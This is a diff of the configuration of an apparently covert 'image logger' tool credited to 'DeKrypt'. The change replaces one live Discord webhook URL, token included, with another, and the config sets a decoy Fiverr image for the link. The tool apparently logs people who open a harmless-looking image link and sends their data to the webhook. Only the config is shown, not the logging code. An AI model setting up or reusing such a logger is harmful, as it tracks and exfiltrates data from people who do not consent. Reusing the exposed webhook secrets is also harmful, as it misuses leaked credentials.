@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1392181400895230033/AbRqHp8_KuKZPTG9XoF3hB8Jsf9cq21gNV8sCI8AEwaZ7WY17xg8OjuImm1ChTWii81Q",
+    "webhook": "https://discord.com/api/webhooks/1396566665382068225/qgE67MdPi7GttUU5T1Y1uppbHjS-C_6xnmLRp4nMUpxRH4RlyfB8Dqir763zB3IRY_sv",
     "image": "https://fiverr-res.cloudinary.com/images/q_auto,f_auto/gigs/269199926/original/260a4fc9607df5d54daaf20b9fae2411d34c3685/make-you-a-custom-fivem-citizen-or-gun-sound-or-rehsade-preset.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
